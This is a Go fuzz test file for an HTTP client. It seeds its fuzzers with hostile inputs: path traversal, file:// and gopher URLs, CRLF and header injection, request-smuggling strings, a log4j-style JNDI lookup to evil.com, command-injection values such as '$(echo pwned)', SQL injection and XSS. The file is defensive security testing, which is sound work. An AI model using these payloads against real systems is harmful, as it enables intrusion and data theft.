// pkg/httpclient/httpclient_fuzz_test.go
//go:build go1.18
// +build go1.18

package httpclient

import (
	"context"
	"crypto/tls"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync/atomic"
	"testing"
	"time"
	"unicode/utf8"
)

// FuzzURLParsing tests URL parsing for security vulnerabilities
func FuzzURLParsing(f *testing.F) {
	// Add seed corpus with various URL formats
	seeds := []string{
		"http://example.com",
		"https://example.com:8080/path",
		"http://user:pass@example.com",
		"https://example.com/path?query=value",
		"http://example.com/path#fragment",
		"https://[::1]:8080/path",
		"http://192.168.1.1:8080",
		"", // empty URL
		"://invalid",
		"http://",
		"https://example.com:99999/path", // invalid port
		"http://example.com/../../etc/passwd", // path traversal
		"http://example.com/path%00.php", // null byte
		"http://example.com/path%0d%0aInjected-Header: value", // CRLF injection
		"http://example.com@evil.com", // URL confusion
		"http://evil.com#@example.com", // fragment confusion
		"javascript:alert('xss')", // XSS attempt
		"file:///etc/passwd", // file protocol
		"gopher://example.com", // gopher protocol
		"dict://example.com", // dict protocol
		"ftp://example.com", // ftp protocol
		"http://example.com:8080@evil.com:9090", // authority confusion
		"http://example.com\r\nHost: evil.com", // host header injection
		"http://example.com%2F%2E%2E%2Fetc%2Fpasswd", // encoded traversal
		"http://example.com/path?cmd=`whoami`", // command injection in query
		"http://example.com/path?q=<script>alert(1)</script>", // XSS in query
		"http://127.0.0.1:8080", // localhost
		"http://0.0.0.0:8080", // all interfaces
		"http://[::ffff:127.0.0.1]", // IPv4-mapped IPv6
		strings.Repeat("http://a", 1000) + ".com", // long URL
		"http://" + strings.Repeat("a", 255) + ".com", // long hostname
		"http://example.com/" + strings.Repeat("a", 10000), // long path
		"http://example.com?" + strings.Repeat("a=b&", 1000), // many params
		"http://☃.com", // unicode domain
		"http://xn--n3h.com", // punycode
		"http://example.com\x00", // null byte variant
		"http://example.com%00", // encoded null
		"http://example.com/../../../", // multiple traversals
		"http://example.com/./././", // dot segments
		"http://example.com//path", // double slash
		"http://example.com\\" + "path", // backslash
		"http://example.com:80:80", // double port
		"http://[email:protected]", // email-like userinfo
		"http://example.com?redirect=http://evil.com", // open redirect
		"http://example.com#<img src=x onerror=alert(1)>", // XSS in fragment
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, rawURL string) {
		// Skip invalid UTF-8
		if !utf8.ValidString(rawURL) {
			t.Skip("Invalid UTF-8 string")
		}

		config := DefaultConfig()
		config.Timeout = 100 * time.Millisecond
		
		client, err := NewClient(config)
		if err != nil {
			t.Fatal(err)
		}

		ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
		defer cancel()

		// Try to make a request with the fuzzed URL
		resp, err := client.Get(ctx, rawURL)
		if resp != nil {
			resp.Body.Close()
		}

		// Check for security issues in URL handling
		if err == nil {
			// If request succeeded, verify it's a valid HTTP/HTTPS URL
			u, parseErr := url.Parse(rawURL)
			if parseErr == nil {
				scheme := strings.ToLower(u.Scheme)
				if scheme != "http" && scheme != "https" {
					t.Errorf("Non-HTTP(S) scheme accepted: %s", scheme)
				}
				
				// Check for localhost/internal network access
				host := strings.ToLower(u.Hostname())
				if strings.Contains(host, "localhost") || 
				   strings.HasPrefix(host, "127.") ||
				   strings.HasPrefix(host, "192.168.") ||
				   strings.HasPrefix(host, "10.") ||
				   strings.HasPrefix(host, "172.") ||
				   host == "0.0.0.0" {
					t.Logf("Warning: Internal network access allowed: %s", host)
				}
			}
		}
	})
}

// FuzzHeaderInjection tests for header injection vulnerabilities
func FuzzHeaderInjection(f *testing.F) {
	// Seed with various header injection attempts
	seeds := []struct {
		name  string
		value string
	}{
		{"X-Normal", "normal value"},
		{"X-Test", "value\r\nX-Injected: malicious"},
		{"X-Test", "value\nX-Injected: malicious"},
		{"X-Test", "value\rX-Injected: malicious"},
		{"X-Test", "value%0d%0aX-Injected: malicious"},
		{"X-Test", "value%0aX-Injected: malicious"},
		{"X-Test", "value%0dX-Injected: malicious"},
		{"Content-Length", "100\r\nX-Injected: malicious"},
		{"Host", "example.com\r\nX-Injected: malicious"},
		{"Authorization", "Bearer token\r\nX-Injected: malicious"},
		{"X-Test\r\nX-Injected", "malicious"},
		{"X-Test\nX-Injected", "malicious"},
		{"X-Test", strings.Repeat("a", 10000)}, // long value
		{"X-" + strings.Repeat("a", 1000), "value"}, // long name
		{"X-Test", "value\x00injected"}, // null byte
		{"X-Test", "value\r\n\r\nGET /admin HTTP/1.1"}, // request smuggling
		{"Transfer-Encoding", "chunked\r\nContent-Length: 0"}, // TE.CL
		{"Content-Length", "10\r\nTransfer-Encoding: chunked"}, // CL.TE
		{"X-Forwarded-For", "127.0.0.1\r\nX-Admin: true"},
		{"X-Test", "${jndi:ldap://evil.com/a}"}, // log4j style
		{"X-Test", "{{7*7}}"}, // template injection
		{"X-Test", "<script>alert(1)</script>"}, // XSS
		{"X-Test", "'; DROP TABLE users; --"}, // SQL injection
		{"X-Test", "`echo pwned`"}, // command injection
		{"X-Test", "$(echo pwned)"}, // command injection
		{"X-Test", "|echo pwned"}, // command injection
		{"X-Test", ";echo pwned"}, // command injection
		{"X-Test", "\"><script>alert(1)</script>"}, // XSS variant
		{"X-Test", "../../../etc/passwd"}, // path traversal
		{"X-Test", "\\r\\n\\r\\n"}, // escaped CRLF
		{"X-Test", "%0d%0a%0d%0a"}, // URL encoded CRLF
		{"X-Test", "\u000d\u000a"}, // Unicode CRLF
	}

	for _, seed := range seeds {
		f.Add(seed.name, seed.value)
	}

	f.Fuzz(func(t *testing.T, headerName, headerValue string) {
		// Skip invalid UTF-8
		if !utf8.ValidString(headerName) || !utf8.ValidString(headerValue) {
			t.Skip("Invalid UTF-8 string")
		}

		// Create test server that echoes headers
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Check if injected headers are present
			for name := range r.Header {
				if strings.Contains(strings.ToLower(name), "injected") {
					t.Errorf("Header injection detected: %s", name)
				}
			}
			
			// Echo headers back
			for name, values := range r.Header {
				for _, value := range values {
					w.Header().Add("Echo-"+name, value)
				}
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		config := DefaultConfig()
		config.Headers = map[string]string{
			headerName: headerValue,
		}

		client, err := NewClient(config)
		if err != nil {
			// Some header names might be invalid
			return
		}

		ctx := context.Background()
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, server.URL, nil)
		if err != nil {
			return
		}

		// Apply headers through client
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		// Additional validation could be done here
	})
}

// FuzzAuthenticationBypass tests for authentication bypass vulnerabilities
func FuzzAuthenticationBypass(f *testing.F) {
	// Seed with various auth bypass attempts
	seeds := []struct {
		authType string
		token    string
		username string
		password string
	}{
		{"bearer", "valid-token", "", ""},
		{"bearer", "", "", ""},
		{"bearer", "null", "", ""},
		{"bearer", "undefined", "", ""},
		{"bearer", "None", "", ""},
		{"bearer", "' OR '1'='1", "", ""},
		{"bearer", "admin", "", ""},
		{"bearer", "../../../etc/passwd", "", ""},
		{"basic", "", "admin", "admin"},
		{"basic", "", "admin", ""},
		{"basic", "", "", "admin"},
		{"basic", "", "admin' OR '1'='1", "pass"},
		{"basic", "", "admin", "' OR '1'='1"},
		{"basic", "", "admin\x00", "pass"},
		{"basic", "", "admin", "pass\x00"},
		{"basic", "", strings.Repeat("a", 10000), "pass"},
		{"basic", "", "user", strings.Repeat("b", 10000)},
		{"", "bypass", "bypass", "bypass"},
		{"invalid", "token", "user", "pass"},
		{"BEARER", "CaseSensitive", "", ""},
		{"basic", "", "user:pass", ""}, // colon in username
		{"basic", "", "", "user:pass"}, // colon in password
		{"bearer", "${jndi:ldap://evil.com/a}", "", ""},
		{"bearer", "{{7*7}}", "", ""},
		{"bearer", "<script>alert(1)</script>", "", ""},
		{"bearer", "'; DROP TABLE users; --", "", ""},
		{"bearer", "`echo pwned`", "", ""},
		{"bearer", "$(echo pwned)", "", ""},
		{"bearer", "|echo pwned", "", ""},
		{"bearer", ";echo pwned", "", ""},
		{"bearer", "\r\nX-Admin: true", "", ""},
		{"basic", "", "admin\r\nX-Admin: true", "pass"},
		{"basic", "", "admin", "pass\r\nX-Admin: true"},
	}

	for _, seed := range seeds {
		f.Add(seed.authType, seed.token, seed.username, seed.password)
	}

	f.Fuzz(func(t *testing.T, authType, token, username, password string) {
		// Skip invalid UTF-8
		if !utf8.ValidString(authType) || !utf8.ValidString(token) || 
		   !utf8.ValidString(username) || !utf8.ValidString(password) {
			t.Skip("Invalid UTF-8 string")
		}

		// Create server that validates auth
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			auth := r.Header.Get("Authorization")
			
			// Check for injection attempts in auth header
			if strings.Contains(auth, "\r") || strings.Contains(auth, "\n") {
				t.Errorf("CRLF injection in Authorization header: %q", auth)
			}
			
			// Simple auth check (in real app would be more complex)
			if auth == "Bearer valid-token" || auth == "Basic dXNlcjpwYXNz" {
				w.WriteHeader(http.StatusOK)
			} else {
				w.WriteHeader(http.StatusUnauthorized)
			}
		}))
		defer server.Close()

		config := DefaultConfig()
		config.AuthConfig = &AuthConfig{
			Type:     AuthType(authType),
			Token:    token,
			Username: username,
			Password: password,
		}

		client, err := NewClient(config)
		if err != nil {
			// Invalid auth config
			return
		}

		ctx := context.Background()
		resp, err := client.Get(ctx, server.URL)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		// Check if bypass succeeded when it shouldn't
		if resp.StatusCode == http.StatusOK {
			// Verify this is legitimate auth
			if authType != "bearer" || token != "valid-token" {
				if authType != "basic" || username != "user" || password != "pass" {
					t.Logf("Potential auth bypass: type=%s, token=%s, user=%s", 
						authType, token, username)
				}
			}
		}
	})
}

// FuzzTLSConfig tests TLS configuration for security issues
func FuzzTLSConfig(f *testing.F) {
	// Seed with various TLS configurations
	seeds := []struct {
		minVersion         uint16
		maxVersion         uint16
		insecureSkipVerify bool
		cipherSuites       []uint16
	}{
		{tls.VersionTLS12, tls.VersionTLS13, false, nil},
		{tls.VersionTLS10, tls.VersionTLS13, false, nil}, // weak TLS
		{tls.VersionSSL30, tls.VersionTLS13, false, nil}, // very weak
		{tls.VersionTLS13, tls.VersionTLS12, false, nil}, // min > max
		{0, 0, true, nil}, // insecure
		{tls.VersionTLS12, tls.VersionTLS13, false, []uint16{
			tls.TLS_RSA_WITH_RC4_128_SHA, // weak cipher
		}},
		{tls.VersionTLS12, tls.VersionTLS13, false, []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, // strong cipher
		}},
		{65535, 65535, false, nil}, // invalid version
		{tls.VersionTLS12, tls.VersionTLS13, false, []uint16{65535}}, // invalid cipher
	}

	for _, seed := range seeds {
		f.Add(seed.minVersion, seed.maxVersion, seed.insecureSkipVerify)
	}

	f.Fuzz(func(t *testing.T, minVersion, maxVersion uint16, insecureSkipVerify bool) {
		config := DefaultConfig()
		config.TLSConfig = &TLSConfig{
			MinVersion:         minVersion,
			MaxVersion:         maxVersion,
			InsecureSkipVerify: insecureSkipVerify,
		}

		_, err := NewClient(config)
		
		// Check for weak TLS configurations
		if err == nil {
			if minVersion < tls.VersionTLS12 && minVersion != 0 {
				t.Logf("Warning: Weak TLS version allowed: %d", minVersion)
			}
			
			if insecureSkipVerify {
				t.Log("Warning: TLS verification disabled")
			}
		}
	})
}

// FuzzRequestBody tests various request body inputs
func FuzzRequestBody(f *testing.F) {
	// Seed with various body payloads
	seeds := []string{
		"",
		"normal body content",
		`{"key": "value"}`,
		`<?xml version="1.0"?><root></root>`,
		strings.Repeat("a", 1024*1024), // 1MB
		"\x00\x01\x02\x03", // binary data
		"Content-Length: 0\r\n\r\nGET /admin HTTP/1.1", // request smuggling
		"0\r\n\r\n", // chunked encoding terminator
		"${jndi:ldap://evil.com/a}", // log4j
		"{{7*7}}", // template injection
		"<script>alert(1)</script>", // XSS
		"'; DROP TABLE users; --", // SQL injection
		"`echo pwned`", // command injection
		"../../../etc/passwd", // path traversal
		"%00", // null byte
		"\r\n\r\n", // CRLF
		strings.Repeat("x", 10*1024*1024), // 10MB - large payload
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, body string) {
		// Skip invalid UTF-8 for text content
		if !utf8.ValidString(body) {
			t.Skip("Invalid UTF-8 string")
		}

		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Check content length
			if r.ContentLength < 0 {
				t.Error("Negative content length")
			}
			
			// Try to read body
			buf := make([]byte, 1024)
			n, _ := r.Body.Read(buf)
			
			// Check for smuggling attempts
			bodyStr := string(buf[:n])
			if strings.Contains(bodyStr, "HTTP/1.1") {
				t.Error("HTTP request smuggling attempt detected")
			}
			
			w.WriteHeader(http.StatusOK)
		}))
		defer server.Close()

		client, err := NewClient(DefaultConfig())
		if err != nil {
			t.Fatal(err)
		}

		ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
		defer cancel()

		resp, err := client.Post(ctx, server.URL, "text/plain", strings.NewReader(body))
		if resp != nil {
			resp.Body.Close()
		}
		
		// Very large bodies might timeout, which is OK
		if err != nil && !strings.Contains(err.Error(), "timeout") {
			// Log unexpected errors
			if len(body) < 1000 {
				t.Logf("Request failed for body: %q, error: %v", body, err)
			}
		}
	})
}

// FuzzRetryLogic tests retry configuration for DoS potential
func FuzzRetryLogic(f *testing.F) {
	seeds := []struct {
		maxRetries   int
		initialDelay int64 // milliseconds
		maxDelay     int64 // milliseconds
		multiplier   float64
	}{
		{3, 100, 1000, 2.0},
		{0, 0, 0, 0},
		{100, 1, 1, 1.0}, // excessive retries
		{10, 10000, 60000, 10.0}, // long delays
		{-1, -100, -1000, -2.0}, // negative values
		{10, 1, 1000000, 1000.0}, // huge multiplier
	}

	for _, seed := range seeds {
		f.Add(seed.maxRetries, seed.initialDelay, seed.maxDelay, seed.multiplier)
	}

	f.Fuzz(func(t *testing.T, maxRetries int, initialDelay, maxDelay int64, multiplier float64) {
		// Skip invalid configurations
		if maxRetries < 0 || maxRetries > 100 {
			return
		}
		if initialDelay < 0 || maxDelay < 0 {
			return
		}
		if multiplier < 0 || multiplier > 100 {
			return
		}

		// Create a server that always fails
		var requestCount int32
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			count := atomic.AddInt32(&requestCount, 1)
			if count > 10 {
				t.Error("Excessive retries detected")
			}
			w.WriteHeader(http.StatusServiceUnavailable)
		}))
		defer server.Close()

		config := DefaultConfig()
		config.Timeout = 5 * time.Second
		config.RetryConfig = &RetryConfig{
			MaxRetries:      maxRetries,
			InitialDelay:    time.Duration(initialDelay) * time.Millisecond,
			MaxDelay:        time.Duration(maxDelay) * time.Millisecond,
			Multiplier:      multiplier,
			RetryableStatus: []int{http.StatusServiceUnavailable},
		}

		client, err := NewClient(config)
		if err != nil {
			return
		}

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()

		start := time.Now()
		resp, _ := client.Get(ctx, server.URL)
		if resp != nil {
			resp.Body.Close()
		}
		elapsed := time.Since(start)

		// Check for DoS potential
		if elapsed > 5*time.Second {
			t.Logf("Warning: Long retry duration: %v with config maxRetries=%d", 
				elapsed, maxRetries)
		}
	})
}